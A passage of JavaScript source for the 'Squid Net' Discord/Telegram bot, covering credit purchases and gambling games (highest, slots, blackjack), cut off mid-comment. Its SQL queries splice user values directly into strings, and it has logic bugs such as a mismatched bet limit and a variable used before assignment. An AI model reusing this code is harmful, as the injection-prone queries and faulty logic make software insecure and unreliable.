          if (runningBot == "Discord") {
            message.channel.send({
              embed
            })
          } else if (runningBot == "Telegram") {
            bot.sendMessage(chatId, `${string}`);
          }
          break;
        }
        if (pur == "plan") {
          planKeys(plan3, amount)
          break;
        } else {
          if (runningBot == "Discord") {
            message.channel.send("https://cdn.discordapp.com/attachments/735045160269905961/756352824853659678/SquidNetNewPricing-2.png")
          } else if (runningBot == "Telegram") {
            bot.sendMessage(chatId, `https://cdn.discordapp.com/attachments/735045160269905961/756352824853659678/SquidNetNewPricing-2.png`);
          }
          var string = `**/creditsbuy plan {PLAN} {AMOUNT}** - Purchase a plan!`
          var embed = new Discord.MessageEmbed()
            .setTitle("Credits Buy")
            .setAuthor("Squid Net")
            .setColor(0x089FEF)
            .setDescription(`${string}`)
            .setTimestamp()
          if (runningBot == "Discord") {
            message.channel.send({
              embed
            })
          } else if (runningBot == "Telegram") {
            bot.sendMessage(chatId, `${string}`);
          }
        }

        break;
      }
      case 'creditsplay': {
        if (parseInt(row.verified) == 0) {
          var string = `Please Complete the Security Captcha to Use This! /captcha`
          var embed = new Discord.MessageEmbed()
            .setTitle("Captcha v0.2:")
            .setAuthor("Squid Net")
            .setColor(0x089FEF)
            .setDescription(`${string}`)
            .setTimestamp()
          if (runningBot == "Discord") {
            message.channel.send({
              embed
            })
          } else if (runningBot == "Telegram") {
            bot.sendMessage(chatId, `${string}`);
          }
          break;
        }
        if (illegal === "true") {
          break;
        }
        var game = '';
        var amount = '';
        var amount2 = '';
        var [game, amount, amount2] = args.toString().toLowerCase().split(",");
        console.log(game)
        if (game == "highest") {
          if (isNaN(amount)) {
            if (runningBot == "Discord") {
              message.channel.send("Not A Number")
            } else if (runningBot == "Telegram") {
              bot.sendMessage(chatId, `Not A Number`);
            }
            return;
          } else {
            if (parseInt(amount) > parseInt(row.credits)) {
              if (runningBot == "Discord") {
                message.channel.send("You dont have that much")
              } else if (runningBot == "Telegram") {
                bot.sendMessage(chatId, `You dont have that much`);
              }
              return;
            }
          }
          if (parseInt(amount) > parseInt("100000")) {
            if (runningBot == "Discord") {
              message.channel.send("100,000 Max Bet")
            } else if (runningBot == "Telegram") {
              bot.sendMessage(chatId, `100,000 Max Bet`);
            }
            return;
          }
          var userA = ["2", "3", "4", "5", "6", "7", "8", "9", "10"]
          var bota = ["2", "3", "4", "5", "6", "7", "8", "9", "10", "5", "6", "7", "8", "9", "10", "5", "6", "7", "8", "9", "10"]
          var botNum = Math.floor(Math.random() * 10) + 4;
          if (botNum > 10) {
            var botNum = 10
          }
          var userNum = Math.floor(Math.random() * 10) + 1;
          if (botNum > userNum) {
            var botWin = true
            var loss = amount;
            var newBal = parseInt(row.credits) - parseInt(amount);
            var string = `You Lost! ${loss} Credits\n New Balance: **${newBal}** Credits\n Borts Score: ${botNum}\n User Score: ${userNum}`
            var embed = new Discord.MessageEmbed()
              .setTitle(`${message.author.tag}'s Highest Gamble!`)
              .setAuthor("Squid Net")
              .setDescription(`${string}`)
              .setColor(0xFF0000)
              .setFooter(``)
            if (runningBot == "Discord") {
              message.channel.send({
                embed
              })
            } else if (runningBot == "Telegram") {
              bot.sendMessage(chatId, `${string}`);
            }
            sql = `UPDATE user SET credits ="${newBal}" WHERE id ="${user}"`;
            con.query(sql)
          } else {
            var botWin = false
            var profits = amount * 1;
            var newBal = parseInt(row.credits) + parseInt(amount);
            var string = `You Won! ${profits} Credits\n New Balance: **${newBal}** Credits\n Borts Score: ${botNum}\n User Score: ${userNum}`
            var embed = new Discord.MessageEmbed()
              .setTitle(`${message.author.tag}'s Highest Gamble!`)
              .setAuthor("Squid Net")
              .setDescription(`${string}`)
              .setColor(0x3fff00)
              .setFooter(``)
            if (runningBot == "Discord") {
              message.channel.send({
                embed
              })
            } else if (runningBot == "Telegram") {
              bot.sendMessage(chatId, `${string}`);
            }
            sql = `UPDATE user SET credits ="${newBal}" WHERE id ="${user}"`;
            con.query(sql)
          }
          break;
        } else if (game == "slots") {
          if (isNaN(amount)) {
            if (runningBot == "Discord") {
              message.channel.send("Not A Number")
            } else if (runningBot == "Telegram") {
              bot.sendMessage(chatId, `Not A Number`);
            }
            return;
          } else {
            if (parseInt(amount) > parseInt(row.credits)) {
              if (runningBot == "Discord") {
                message.channel.send("You dont have that much")
              } else if (runningBot == "Telegram") {
                bot.sendMessage(chatId, `You dont have that much`);
              }
              return;
            }
          }
          if (parseInt(amount) > parseInt("1000000")) {
            if (runningBot == "Discord") {
              message.channel.send("1,000,000 Max Bet")
            } else if (runningBot == "Telegram") {
              bot.sendMessage(chatId, `1,000,000 Max Bet`);
            }
            return;
          }
          const emotes = [':poop:', ':clown:', ':roll_of_paper:', ':chocolate_bar:', ':pizza:', ':100:', ':seven:']
          let slotsNums = []
          let random
          let slotString = '**-----------------\n**'
          let bet = parseInt(amount);
          var balance = parseInt(row.credits);
          bet = Math.round(bet)
          let profits
          let result
          let count
          var randomInArray = function(anArray) {
            var randomIndex = Math.floor(Math.random() * anArray.length)
            return anArray[randomIndex];
          }
          for (count = 0; count < 9; count++) {
            random = randomInArray(emotes)
            slotsNums.push(random)
            slotString += slotsNums[count] + ' '

            if (count === 2 || count === 5 || count === 8) {
              if (count === 5) {
                slotString += '**<<<**'
              }
              slotString += '\n'
            } else {
              slotString += ': '
            }
          }
          slotString += '**-----------------**\n'
          if (slotsNums[3] === slotsNums[4] && slotsNums[3] === slotsNums[5] && slotsNums[4] === slotsNums[5]) {
            profits = bet * 2
            result = `THREE MATCHES! You've tripled your bet`
            var newBal = parseInt(row.credits) + parseInt(profits);
            var string = `${slotString} **You Won! ${profits} Credits\n New Balance: ${newBal} Credits**`
            var embed = new Discord.MessageEmbed()
              .setTitle(`${message.author.tag}'s Slot Machine!`)
              .setAuthor("Squid Net")
              .setDescription(`${string}`)
              .setColor(0x3fff00)
              .setFooter(`You need atleast 2 matching to win!`)
            if (runningBot == "Discord") {
              message.channel.send({
                embed
              })
            } else if (runningBot == "Telegram") {
              bot.sendMessage(chatId, ``);
            }
            sql = `UPDATE user SET credits ="${newBal}" WHERE id ="${user}"`;
            con.query(sql)
          } else if (slotsNums[3] === slotsNums[4] || slotsNums[3] === slotsNums[5] || slotsNums[4] === slotsNums[5]) {
            profits = bet * 1
            result = `Two matches! You've doubled your bet`
            var newBal = parseInt(row.credits) + parseInt(profits);
            var string = `${slotString} **You Won! ${profits} Credits\n New Balance: ${newBal} Credits**`
            var embed = new Discord.MessageEmbed()
              .setTitle(`${message.author.tag}'s Slot Machine!`)
              .setAuthor("Squid Net")
              .setDescription(`${string}`)
              .setColor(0x3fff00)
              .setFooter(`You need atleast 2 matching to win!`)
            if (runningBot == "Discord") {
              message.channel.send({
                embed
              })
            } else if (runningBot == "Telegram") {
              bot.sendMessage(chatId, ``);
            }
            sql = `UPDATE user SET credits ="${newBal}" WHERE id ="${user}"`;
            con.query(sql)
          } else {
            profits = bet * 0
            result = `No matches... You've lost`
            var loss = amount;
            var newBal = parseInt(row.credits) - parseInt(loss);
            var string = `${slotString} **You Lost! ${loss} Credits\n New Balance: ${newBal} Credits**`
            var embed = new Discord.MessageEmbed()
              .setTitle(`${message.author.tag}'s Slot Machine!`)
              .setAuthor("Squid Net")
              .setDescription(`${string}`)
              .setColor(0xFF0000)
              .setFooter(`You need atleast 2 matching to win!`)
            if (runningBot == "Discord") {
              message.channel.send({
                embed
              })
            } else if (runningBot == "Telegram") {
              bot.sendMessage(chatId, ``);
            }
            sql = `UPDATE user SET credits ="${newBal}" WHERE id ="${user}"`;
            con.query(sql)
          }
          break;
        } else if (game == "blackjack") {
          if (amount == "hit" || amount == "h" || amount == "double" || amount == "d") {
            var aasasdas = 1
          } else if (amount == "stand" || amount == "s") {
            var aasasdas = 1
          } else {

            if (isNaN(amount)) {
              if (runningBot == "Discord") {
                message.channel.send("Not A Number")
              } else if (runningBot == "Telegram") {
                bot.sendMessage(chatId, `Not A Number`);
              }
              return;
            } else {
              if (parseInt(amount) > parseInt(row.credits)) {
                if (runningBot == "Discord") {
                  message.channel.send("You dont have that much")
                } else if (runningBot == "Telegram") {
                  bot.sendMessage(chatId, `You dont have that much`);
                }
                return;
              }
            }
            if (parseInt(amount) > parseInt("250000")) {
              if (runningBot == "Discord") {
                message.channel.send("250,000 Max Bet")
              } else if (runningBot == "Telegram") {
                bot.sendMessage(chatId, `250,000 Max Bet`);
              }
              return;
            }
          }
          mcred = row.credits
          con.query(`SELECT * FROM blackjack WHERE id = "${user}"`, (err, rows) => {
            if (err) throw err;
            rows.forEach((row) => {
              var userCardA = Math.floor(Math.random() * 10) + 1
              var userCardB = Math.floor(Math.random() * 10) + 1
              var botCardA = Math.floor(Math.random() * 10) + 1
              var botCardB = Math.floor(Math.random() * 10) + 1
              var gameState = parseInt(row.gameState)
              console.log(gameState)
              if (gameState) {
                if (!parseInt(row.isStand)) {
                  if (amount == "hit" || amount == "h" || amount == "double" || amount == "d") {
                    var newCards = `${row.userCards},${userCardA}`
                    var array1 = newCards.toString().split(",")
                  } else {
                    var array1 = row.userCards.split(",")
                  }
                  var [card1, card2, card3, card4, card5, card6, card7, card8, card9, card10] = array1.toString().split(",");
                  if (!card3) {
                    var card3 = 0;
                  }
                  if (!card4) {
                    var card4 = 0;
                  }
                  if (!card5) {
                    var card5 = 0;
                  }
                  if (!card6) {
                    var card6 = 0;
                  }
                  if (!card7) {
                    var card7 = 0;
                  }
                  if (!card8) {
                    var card8 = 0;
                  }
                  if (!card9) {
                    var card9 = 0;
                  }
                  if (!card10) {
                    var card10 = 0;
                  }
                  var total = parseInt(card1) + parseInt(card2) + parseInt(card3) + parseInt(card4) + parseInt(card5) + parseInt(card6) + parseInt(card7) + parseInt(card8) + parseInt(card9) + parseInt(card10)
                  if (amount == "hit" || amount == "h" || amount == "double" || amount == "d") {
                    if (amount == "double" || amount == "d") {
                      if (parseInt(ddNew) > parseInt(mcred)) {
                        if (runningBot == "Discord") {
                          message.channel.send("You dont have enough to double down")
                        } else if (runningBot == "Telegram") {
                          bot.sendMessage(chatId, `You dont have enough to double down`);
                        }
                        return;
                      } else {
                        var ddNew = parseInt(row.gameState) * 2;
                        sql = `UPDATE blackjack SET gameState ="${ddNew}" WHERE id ="${user}"`;
                        con.query(sql)
                      }
                      sql = `UPDATE blackjack SET userCards ="${newCards}" WHERE id ="${user}"`;
                      con.query(sql)
                    } else {
                      sql = `UPDATE blackjack SET userCards ="${newCards}" WHERE id ="${user}"`;
                      con.query(sql)
                    }
                  } else if (amount == "stand" || amount == "s") {
                    sql = `UPDATE blackjack SET isStand ="1" WHERE id ="${user}"`;
                    con.query(sql)
                    var bortTotal = 0;
                    var botCardA = Math.floor(Math.random() * 10) + 1
                    var newCards = `${row.botCards},${userCardA}`
                    while (bortTotal < 17) {
                      var botCardB = Math.floor(Math.random() * 10) + 1
                      var newCards = `${newCards},${botCardB}`
                      var array1 = newCards.toString().split(",")
                      var [card1, card2, card3, card4, card5, card6, card7, card8, card9, card10] = array1.toString().split(",");
                      if (!card3) {
                        var card3 = 0;
                      }
                      if (!card4) {
                        var card4 = 0;
                      }
                      if (!card5) {
                        var card5 = 0;
                      }
                      if (!card6) {
                        var card6 = 0;
                      }
                      if (!card7) {
                        var card7 = 0;
                      }
                      if (!card8) {
                        var card8 = 0;
                      }
                      if (!card9) {
                        var card9 = 0;
                      }
                      if (!card10) {
                        var card10 = 0;
                      }
                      //console.log(card1, card2, card3, card4, card5, card6, card7, card8, card9, card10)
                      var bortTotal = parseInt(card1) + parseInt(card2) + parseInt(card3) + parseInt(card4) + parseInt(card5) + parseInt(card6) + parseInt(card7) + parseInt(card8) + parseInt(card9) + parseInt(card10)
                      var array2 = row.userCards.split(",")
                      var [card1, card2, card3, card4, card5, card6, card7, card8, card9, card10] = array2.toString().split(",");
                      if (!card3) {
                        var card3 = 0;
                      }
                      if (!card4) {
                        var card4 = 0;
                      }
                      if (!card5) {
                        var card5 = 0;
                      }
                      if (!card6) {
                        var card6 = 0;
                      }
                      if (!card7) {
                        var card7 = 0;
                      }
                      if (!card8) {
                        var card8 = 0;
                      }
                      if (!card9) {
                        var card9 = 0;
                      }
                      if (!card10) {
                        var card10 = 0;
                      }
                      var total = parseInt(card1) + parseInt(card2) + parseInt(card3) + parseInt(card4) + parseInt(card5) + parseInt(card6) + parseInt(card7) + parseInt(card8) + parseInt(card9) + parseInt(card10)
                      var bortSeperateCards = array1.toString();
                      var seperateCards = array2.toString();
                      var bortGoodCards = bortSeperateCards.replace(/\,/g, "] [");
                      var goodCards = seperateCards.replace(/\,/g, "] [");
                      if (parseInt(bortTotal) == 21) {
                        var newCredits = parseInt(gameState);
                        var string = `**BORT 21!**\n You lost **${row.gameState}** Credits!\n**Your Cards** - [${goodCards}]\n**Your Total** - [${total}]\n**Borts Cards** - [${bortGoodCards}]\n**Bort Total** - [${bortTotal}]`
                        var embed = new Discord.MessageEmbed()
                          .setTitle("Credits Blackjack:")
                          .setAuthor("Squid Net")
                          .setColor(0xFF0000)
                          .setDescription(`${string}`)
                          .setTimestamp()
                        if (runningBot == "Discord") {
                          message.channel.send({
                            embed
                          })
                        } else if (runningBot == "Telegram") {
                          bot.sendMessage(chatId, `${string}`);
                        }
                        sql = `UPDATE blackjack SET gameState ="0" WHERE id ="${user}"`;
                        con.query(sql)
                        con.query(`SELECT * FROM user WHERE id = "${user}"`, (err, rows) => {
                          if (err) throw err;
                          rows.forEach((row) => {
                            var newCreds = parseInt(row.credits) - parseInt(newCredits)
                            sql = `UPDATE user SET credits="${newCreds}" WHERE id ="${user}"`;
                            con.query(sql)
                          })
                        });
                        sql = `UPDATE blackjack SET isStand ="0" WHERE id ="${user}"`;
                        con.query(sql)
                        return;
                      } else if (parseInt(bortTotal) > 21) {
                        var newCredits = parseInt(gameState) * 1;
                        var string = `**BORT BUST!**\n You win **${newCredits}** Credits!\n**Your Cards** - [${goodCards}]\n**Your Total** - [${total}]\n**Borts Cards** - [${bortGoodCards}]\n**Bort Total** - [${bortTotal}]`
                        var embed = new Discord.MessageEmbed()
                          .setTitle("Credits Blackjack:")
                          .setAuthor("Squid Net")
                          .setColor(0x3fff00)
                          .setDescription(`${string}`)
                          .setTimestamp()
                        if (runningBot == "Discord") {
                          message.channel.send({
                            embed
                          })
                        } else if (runningBot == "Telegram") {
                          bot.sendMessage(chatId, `${string}`);
                        }
                        sql = `UPDATE blackjack SET gameState ="0" WHERE id ="${user}"`;
                        con.query(sql)
                        con.query(`SELECT * FROM user WHERE id = "${user}"`, (err, rows) => {
                          if (err) throw err;
                          rows.forEach((row) => {
                            var newCreds = parseInt(row.credits) + parseInt(newCredits)
                            sql = `UPDATE user SET credits="${newCreds}" WHERE id ="${user}"`;
                            con.query(sql)
                          })
                        });
                        sql = `UPDATE blackjack SET isStand ="0" WHERE id ="${user}"`;
                        con.query(sql)
                        return;
                      } else if (parseInt(bortTotal) > 17) {
                        if (bortTotal > total) {
                          var newCredits = parseInt(gameState);
                          var string = `**BORT WON!**\n You lose **${row.gameState}** Credits!\n**Your Cards** - [${goodCards}]\n**Your Total** - [${total}]\n**Borts Cards** - [${bortGoodCards}]\n**Bort Total** - [${bortTotal}]`
                          var embed = new Discord.MessageEmbed()
                            .setTitle("Credits Blackjack:")
                            .setAuthor("Squid Net")
                            .setColor(0xFF0000)
                            .setDescription(`${string}`)
                            .setTimestamp()
                          if (runningBot == "Discord") {
                            message.channel.send({
                              embed
                            })
                          } else if (runningBot == "Telegram") {
                            bot.sendMessage(chatId, `${string}`);
                          }
                          sql = `UPDATE blackjack SET gameState ="0" WHERE id ="${user}"`;
                          con.query(sql)
                          con.query(`SELECT * FROM user WHERE id = "${user}"`, (err, rows) => {
                            if (err) throw err;
                            rows.forEach((row) => {
                              var newCreds = parseInt(row.credits) - parseInt(newCredits)
                              sql = `UPDATE user SET credits="${newCreds}" WHERE id ="${user}"`;
                              con.query(sql)
                            })
                          });
                          sql = `UPDATE blackjack SET isStand ="0" WHERE id ="${user}"`;
                          con.query(sql)
                          return;
                        } else {
                          var newCredits = parseInt(gameState) * 1;
                          var string = `**WIN!**\n You won **${newCredits}** Credits!\n**Your Cards** - [${goodCards}]\n**Your Total** - [${total}]\n**Borts Cards** - [${bortGoodCards}]\n**Bort Total** - [${bortTotal}]`
                          var embed = new Discord.MessageEmbed()
                            .setTitle("Credits Blackjack:")
                            .setAuthor("Squid Net")
                            .setColor(0x3fff00)
                            .setDescription(`${string}`)
                            .setTimestamp()
                          if (runningBot == "Discord") {
                            message.channel.send({
                              embed
                            })
                          } else if (runningBot == "Telegram") {
                            bot.sendMessage(chatId, `${string}`);
                          }
                          sql = `UPDATE blackjack SET gameState ="0" WHERE id ="${user}"`;
                          con.query(sql)
                          con.query(`SELECT * FROM user WHERE id = "${user}"`, (err, rows) => {
                            if (err) throw err;
                            rows.forEach((row) => {
                              var newCreds = parseInt(row.credits) + parseInt(newCredits)
                              sql = `UPDATE user SET credits="${newCreds}" WHERE id ="${user}"`;
                              con.query(sql)
                            })
                          });
                          sql = `UPDATE blackjack SET isStand ="0" WHERE id ="${user}"`;
                          con.query(sql)
                        }
                      }
                    }
                  } else {
                    var string = `Invalid Response\n **/creditsplay blackjack {MOVE}**\nAvailable Moves - Hit/H Stand/S Double/d`
                    var embed = new Discord.MessageEmbed()
                      .setTitle("Credits Blackjack:")
                      .setAuthor("Squid Net")
                      .setColor(0x089FEF)
                      .setDescription(`${string}`)
                      .setTimestamp()
                    if (runningBot == "Discord") {
                      message.channel.send({
                        embed
                      })
                    } else if (runningBot == "Telegram") {
                      bot.sendMessage(chatId, `${string}`);
                    }
                    return;
                  }
                  var seperateCards = array1.toString();
                  console.log("card")
                  console.log(seperateCards)
                  var goodCards = seperateCards.replace(/\,/g, "] [");
                  if (parseInt(total) == 21) {
                    var newCredits = parseInt(gameState) * 1.5;
                    var string = `**21!**\n You win **${newCredits}** Credits!\n**Your Cards** - [${goodCards}]\n**Your Total** - [${total}]\n**Borts Cards** - [${row.botCards}] [X]`
                    var embed = new Discord.MessageEmbed()
                      .setTitle("Credits Blackjack:")
                      .setAuthor("Squid Net")
                      .setColor(0x3fff00)
                      .setDescription(`${string}`)
                      .setTimestamp()
                    if (runningBot == "Discord") {
                      message.channel.send({
                        embed
                      })
                    } else if (runningBot == "Telegram") {
                      bot.sendMessage(chatId, `${string}`);
                    }
                    sql = `UPDATE blackjack SET gameState ="0" WHERE id ="${user}"`;
                    con.query(sql)
                    con.query(`SELECT * FROM user WHERE id = "${user}"`, (err, rows) => {
                      if (err) throw err;
                      rows.forEach((row) => {
                        var newCreds = parseInt(row.credits) + parseInt(newCredits)
                        sql = `UPDATE user SET credits="${newCreds}" WHERE id ="${user}"`;
                        con.query(sql)
                      })
                    });
                    sql = `UPDATE blackjack SET isStand ="0" WHERE id ="${user}"`;
                    con.query(sql)
                    return;
                  } else if (parseInt(total) > 21) {
                    var newCredits = parseInt(gameState);
                    var string = `**BUST!**\n You lost **${row.gameState}** Credits!\n**Your Cards** - [${goodCards}]\n**Your Total** - [${total}]\n**Borts Cards** - [${row.botCards}] [X]`
                    var embed = new Discord.MessageEmbed()
                      .setTitle("Credits Blackjack:")
                      .setAuthor("Squid Net")
                      .setColor(0xFF0000)
                      .setDescription(`${string}`)
                      .setTimestamp()
                    if (runningBot == "Discord") {
                      message.channel.send({
                        embed
                      })
                    } else if (runningBot == "Telegram") {
                      bot.sendMessage(chatId, `${string}`);
                    }
                    sql = `UPDATE blackjack SET gameState ="0" WHERE id ="${user}"`;
                    con.query(sql)
                    con.query(`SELECT * FROM user WHERE id = "${user}"`, (err, rows) => {
                      if (err) throw err;
                      rows.forEach((row) => {
                        var newCreds = parseInt(row.credits) - parseInt(newCredits)
                        sql = `UPDATE user SET credits="${newCreds}" WHERE id ="${user}"`;
                        con.query(sql)
                      })
                    });
                    sql = `UPDATE blackjack SET isStand ="0" WHERE id ="${user}"`;
                    con.query(sql)
                    return;
                  } else {
                    var string = `**Your Cards** - [${goodCards}]\n**Your Total** - [${total}]\n**Borts Cards** - [${row.botCards}] [X]`
                    var embed = new Discord.MessageEmbed()
                      .setTitle("Credits Blackjack:")
                      .setAuthor("Squid Net")
                      .setColor(0x089FEF)
                      .setDescription(`${string}`)
                      .setTimestamp()
                    if (runningBot == "Discord") {
                      message.channel.send({
                        embed
                      })
                    } else if (runningBot == "Telegram") {
                      bot.sendMessage(chatId, `${string}`);
                    }
                  }
                } else {
                  // BORT PLAYS NOW
                  var bortTotal = 0;
                  var botCardA = Math.floor(Math.random() * 10) + 1
                  var newCards = `${row.botCards},${userCardA}`
                  while (bortTotal < 17) {
                    var botCardB = Math.floor(Math.random() * 10) + 1
                    var newCards = `${newCards},${botCardB}`
                    var array1 = newCards.toString().split(",")
                    var [card1, card2, card3, card4, card5, card6, card7, card8, card9, card10] = array1.toString().split(",");
                    if (!card3) {
                      var card3 = 0;
                    }
                    if (!card4) {
                      var card4 = 0;
                    }
                    if (!card5) {
                      var card5 = 0;
                    }
                    if (!card6) {
                      var card6 = 0;
                    }
                    if (!card7) {
                      var card7 = 0;
                    }
                    if (!card8) {
                      var card8 = 0;
                    }
                    if (!card9) {
                      var card9 = 0;
                    }
                    if (!card10) {
                      var card10 = 0;
                    }
                    //console.log(card1, card2, card3, card4, card5, card6, card7, card8, card9, card10)
                    var bortTotal = parseInt(card1) + parseInt(card2) + parseInt(card3) + parseInt(card4) + parseInt(card5) + parseInt(card6) + parseInt(card7) + parseInt(card8) + parseInt(card9) + parseInt(card10)
                    var array2 = row.userCards.split(",")
                    var [card1, card2, card3, card4, card5, card6, card7, card8, card9, card10] = array2.toString().split(",");
                    if (!card3) {
                      var card3 = 0;
                    }
                    if (!card4) {
                      var card4 = 0;
                    }
                    if (!card5) {
                      var card5 = 0;
                    }
                    if (!card6) {
                      var card6 = 0;
                    }
                    if (!card7) {
                      var card7 = 0;
                    }
                    if (!card8) {
                      var card8 = 0;
                    }
                    if (!card9) {
                      var card9 = 0;
                    }
                    if (!card10) {
                      var card10 = 0;
                    }
                    var total = parseInt(card1) + parseInt(card2) + parseInt(card3) + parseInt(card4) + parseInt(card5) + parseInt(card6) + parseInt(card7) + parseInt(card8) + parseInt(card9) + parseInt(card10)
                    var bortSeperateCards = array1.toString();
                    var seperateCards = array2.toString();
                    var bortGoodCards = bortSeperateCards.replace(/\,/g, "] [");
                    var goodCards = seperateCards.replace(/\,/g, "] [");
                    if (parseInt(bortTotal) == 21) {
                      var newCredits = parseInt(gameState) * 0;
                      var string = `**BORT 21!**\n You lost **${row.gameState}** Credits!\n**Your Cards** - [${goodCards}]\n**Your Total** - [${total}]\n**Borts Cards** - [${bortGoodCards}]\n**Bort Total** - [${bortTotal}]`
                      var embed = new Discord.MessageEmbed()
                        .setTitle("Credits Blackjack:")
                        .setAuthor("Squid Net")
                        .setColor(0xFF0000)
                        .setDescription(`${string}`)
                        .setTimestamp()
                      if (runningBot == "Discord") {
                        message.channel.send({
                          embed
                        })
                      } else if (runningBot == "Telegram") {
                        bot.sendMessage(chatId, `${string}`);
                      }
                      sql = `UPDATE blackjack SET gameState ="0" WHERE id ="${user}"`;
                      con.query(sql)
                      con.query(`SELECT * FROM user WHERE id = "${user}"`, (err, rows) => {
                        if (err) throw err;
                        rows.forEach((row) => {
                          var newCreds = parseInt(row.credits) + parseInt(newCredits)
                          sql = `UPDATE user SET credits="${newCreds}" WHERE id ="${user}"`;
                          con.query(sql)
                        })
                      });
                      sql = `UPDATE blackjack SET isStand ="0" WHERE id ="${user}"`;
                      con.query(sql)
                      return;
                    } else if (parseInt(bortTotal) > 21) {
                      var newCredits = parseInt(gameState) * 1;
                      var string = `**BORT BUST!**\n You win **${newCredits}** Credits!\n**Your Cards** - [${goodCards}]\n**Your Total** - [${total}]\n**Borts Cards** - [${bortGoodCards}]\n**Bort Total** - [${bortTotal}]`
                      var embed = new Discord.MessageEmbed()
                        .setTitle("Credits Blackjack:")
                        .setAuthor("Squid Net")
                        .setColor(0x3fff00)
                        .setDescription(`${string}`)
                        .setTimestamp()
                      if (runningBot == "Discord") {
                        message.channel.send({
                          embed
                        })
                      } else if (runningBot == "Telegram") {
                        bot.sendMessage(chatId, `${string}`);
                      }
                      sql = `UPDATE blackjack SET gameState ="0" WHERE id ="${user}"`;
                      con.query(sql)
                      con.query(`SELECT * FROM user WHERE id = "${user}"`, (err, rows) => {
                        if (err) throw err;
                        rows.forEach((row) => {
                          var newCreds = parseInt(row.credits) + parseInt(newCredits)
                          sql = `UPDATE user SET credits="${newCreds}" WHERE id ="${user}"`;
                          con.query(sql)
                        })
                      });
                      sql = `UPDATE blackjack SET isStand ="0" WHERE id ="${user}"`;
                      con.query(sql)
                      return;
                    } else if (parseInt(bortTotal) > 16) {
                      if (bortTotal > total) {
                        var newCredits = parseInt(gameState) * 0;
                        var string = `**BORT WON!**\n You lose **${row.gameState}** Credits!\n**Your Cards** - [${goodCards}]\n**Your Total** - [${total}]\n**Borts Cards** - [${bortGoodCards}]\n**Bort Total** - [${bortTotal}]`
                        var embed = new Discord.MessageEmbed()
                          .setTitle("Credits Blackjack:")
                          .setAuthor("Squid Net")
                          .setColor(0xFF0000)
                          .setDescription(`${string}`)
                          .setTimestamp()
                        if (runningBot == "Discord") {
                          message.channel.send({
                            embed
                          })
                        } else if (runningBot == "Telegram") {
                          bot.sendMessage(chatId, `${string}`);
                        }
                        sql = `UPDATE blackjack SET gameState ="0" WHERE id ="${user}"`;
                        con.query(sql)
                        con.query(`SELECT * FROM user WHERE id = "${user}"`, (err, rows) => {
                          if (err) throw err;
                          rows.forEach((row) => {
                            var newCreds = parseInt(row.credits) - parseInt(newCredits)
                            sql = `UPDATE user SET credits="${newCreds}" WHERE id ="${user}"`;
                            con.query(sql)
                          })
                        });
                        sql = `UPDATE blackjack SET isStand ="0" WHERE id ="${user}"`;
                        con.query(sql)
                        return;
                      } else {
                        var newCredits = parseInt(gameState) * 1;
                        var string = `**WIN!**\n You won **${newCredits}** Credits!\n**Your Cards** - [${goodCards}]\n**Your Total** - [${total}]\n**Borts Cards** - [${bortGoodCards}]\n**Bort Total** - [${bortTotal}]`
                        var embed = new Discord.MessageEmbed()
                          .setTitle("Credits Blackjack:")
                          .setAuthor("Squid Net")
                          .setColor(0x3fff00)
                          .setDescription(`${string}`)
                          .setTimestamp()
                        if (runningBot == "Discord") {
                          message.channel.send({
                            embed
                          })
                        } else if (runningBot == "Telegram") {
                          bot.sendMessage(chatId, `${string}`);
                        }
                        sql = `UPDATE blackjack SET gameState ="0" WHERE id ="${user}"`;
                        con.query(sql)
                        con.query(`SELECT * FROM user WHERE id = "${user}"`, (err, rows) => {
                          if (err) throw err;
                          rows.forEach((row) => {
                            var newCreds = parseInt(row.credits) + parseInt(newCredits)
                            sql = `UPDATE user SET credits="${newCreds}" WHERE id ="${user}"`;
                            con.query(sql)
                          })
                        });
                        sql = `UPDATE blackjack SET isStand ="0" WHERE id ="${user}"`;
                        con.query(sql)
                      }
                    }
                  }
                }
              } else {
                if (isNaN(amount)) {
                  var string = "Not a number."
                  if (runningBot == "Discord") {
                    message.channel.send(`${string}`)
                  } else if (runningBot == "Telegram") {
                    bot.sendMessage(chatId, `${string}`);
                  }
                  return;
                } else {
                  if (parseInt(amount) > parseInt(row.credits)) {
                    var string = "You dont have that much!"
                    if (runningBot == "Discord") {
                      message.channel.send(`${string}`)
                    } else if (runningBot == "Telegram") {
                      bot.sendMessage(chatId, `${string}`);
                    }
                    return;
                  }
                }
                if (parseInt(amount) > parseInt("500000")) {
                  var string = "250,000 Max Bet"
                  if (runningBot == "Discord") {
                    message.channel.send(`${string}`)
                  } else if (runningBot == "Telegram") {
                    bot.sendMessage(chatId, `${string}`);
                  }
                  return;
                }
                sql = `UPDATE blackjack SET gameState ="${amount}" WHERE id ="${user}"`;
                con.query(sql)
                var total = parseInt(userCardA) + parseInt(userCardB)
                var string = `**Your Cards** - [${userCardA}] [${userCardB}]\n**Your Total** - [${total}]\n**Borts Cards** - [${botCardA}] [X]\n\n**/creditsplay blackjack {MOVE}**\nAvailable Moves - Hit/H Stand/S Double/D`
                var embed = new Discord.MessageEmbed()
                  .setTitle("Credits Blackjack:")
                  .setAuthor("Squid Net")
                  .setColor(0x089FEF)
                  .setDescription(`${string}`)
                  .setTimestamp()
                if (runningBot == "Discord") {
                  message.channel.send({
                    embed
                  })
                } else if (runningBot == "Telegram") {
                  bot.sendMessage(chatId, `${string}`);
                }
                sql = `UPDATE blackjack SET userCards ="${userCardA},${userCardB}" WHERE id ="${user}"`;
                con.query(sql);
              }
            })
          });
          break;
          /*} else if (game == "poker123") {
            var c1 = ":Ace_clubs:"
            var c2 = ":2_clubs:"
            var c3 = ":3_clubs:"
            var c4 = ":4_clubs:"
            var c5 = ":5_clubs:"
            var c6 = ":6_clubs:"
            var c7 = ":7_clubs:"
            var c8 = ":8_clubs:"
            var c9 = ":9_clubs:"
            var c10 = ":10_clubs:"
            var c11 = ":Jack_clubs:"
            var c12 = ":Queen_clubs:"
            var c13 = ":King_clubs:"
            var c14 = ":Ace_diamonds:"
            var c15 = ":2_diamonds:"
            var c16 = ":3_diamonds:"
            var c17 = ":4_diamonds:"
            var c18 = ":5_diamonds:"
            var c19 = ":6_diamonds:"
            var c20 = ":7_diamonds:"
            var c21 = ":8_diamonds:"
            var c22 = ":9_diamonds:"
            var c23 = ":10_diamonds:"
            var c24 = ":Jack_diamonds:"
            var c25 = ":Queen_diamonds:"
            var c26 = ":King_diamonds:"
            var c27 = ":Ace_hearts:"
            var c28 = ":2_hearts:"
            var c29 = ":3_hearts:"
            var c30 = ":4_hearts:"
            var c31 = ":5_hearts:"
            var c32 = ":6_hearts:"
            var c33 = ":7_hearts:"
            var c34 = ":8_hearts:"
